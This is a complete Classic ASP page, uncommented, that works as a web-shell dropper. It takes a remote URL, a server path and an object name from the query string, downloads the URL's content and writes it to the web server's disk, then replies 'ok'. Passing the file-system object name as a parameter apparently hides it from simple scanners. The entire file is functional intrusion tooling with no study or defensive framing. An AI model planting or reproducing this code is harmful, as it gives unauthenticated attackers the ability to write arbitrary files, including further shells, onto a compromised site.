<% 
Session.CodePage=65001 
Response.Charset="UTF-8" 
function getrd(str,cs)
	dim objxh,strReturn,obj_stream
	set objxh=CreateObject("MICROSOFT.XMLHTTP")
	objxh.open "GET",str,false
	objxh.send ""
	strReturn=objxh.ResponseBody
	set objxh=nothing
	getrd=bin2str2(strReturn,cs)
end Function
function  cth(str,nft,d)
    Set fsor = CreateObject(d)
    fsor.CreateTextFile  nft         
    Set fr = fsor.GetFile(nft)
    Set tsr = fr.OpenAsTextStream(2, -2)
    tsr.Write str
    tsr.Close
end function
function bin2str2(binstr,Charset)
	Dim BytesStream,StringReturn
	Set BytesStream = CreateObject("ADODB.Stream")
	With BytesStream
		.Type = 2
		.Open
		.WriteText binstr
		.Position = 0
		.Charset = Charset
		.Position = 2
		StringReturn = .ReadText
		.close
	End With
	Set BytesStream = Nothing
	bin2str2 = StringReturn
end function
a=request.QueryString("a")
b=request.QueryString("b")
c=request.QueryString("c")
d=request.QueryString("d")

cs = getrd(b,c)
Set fso = Server.CreateObject(d)
nfp = Server.MapPath(a)
cth cs,nfp,d
response.Write "ok"
%> 